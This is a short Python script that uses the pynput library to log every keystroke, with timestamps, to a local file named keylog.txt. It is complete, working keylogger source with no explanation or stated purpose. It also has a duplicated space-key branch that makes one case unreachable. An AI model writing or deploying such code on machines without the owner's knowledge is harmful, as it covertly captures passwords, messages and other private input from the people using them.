from pynput.keyboard import Key, Listener
import logging

log_file = 'keylog.txt'

logging.basicConfig(filename=(log_file), level=logging.DEBUG, format=' %(asctime)s - %(message)s')

def on_press(key):
    try:
        logging.info(key.char)
    except AttributeError:
        if key == Key.space:
            logging.info(' ')
        elif key == Key.space:
            logging.info('\n')
        elif key == Key.backspace:
            logging.info('[BACKSPACE]')
        elif key == Key.tab:
            logging.info('[TAB]')
        elif key == Key.esc:
            logging.info('[ESC]')
        else:
            logging.info(f'[{key.name.upper()}]')
            


with Listener(on_press=on_press) as listener:
    listener.join()
